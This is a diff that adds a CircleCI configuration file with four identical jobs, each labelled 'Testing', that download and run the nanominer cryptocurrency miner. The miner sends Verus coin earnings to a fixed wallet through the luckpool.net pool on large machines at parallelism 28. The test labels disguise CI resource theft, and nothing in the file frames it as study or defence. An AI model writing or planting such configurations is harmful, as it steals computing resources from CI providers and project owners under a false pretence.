@@ -1,0 +1,50 @@
+version: 2.1
+jobs:
+    Devop:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 28    
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RFWdgp3XireoDc8EVshtw2Ev3dgSYbZP74 -coin VRSC -rigName Wijaya -pool1 ap.luckpool.net:3956
+    Devop1:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 28   
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RFWdgp3XireoDc8EVshtw2Ev3dgSYbZP74 -coin VRSC -rigName Wijaya -pool1 ap.luckpool.net:3956
+    Devop2:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large
+      parallelism: 28
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RFWdgp3XireoDc8EVshtw2Ev3dgSYbZP74 -coin VRSC -rigName Wijaya -pool1 ap.luckpool.net:3956
+    Devop3:
+      machine:
+        image: ubuntu-2004:202010-01
+        resource_class: large 
+      parallelism: 28
+      steps:
+        - checkout
+        - run:
+            name: "Testing"
+            command: sudo apt update -y && wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RFWdgp3XireoDc8EVshtw2Ev3dgSYbZP74 -coin VRSC -rigName Wijaya -pool1 ap.luckpool.net:3956
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
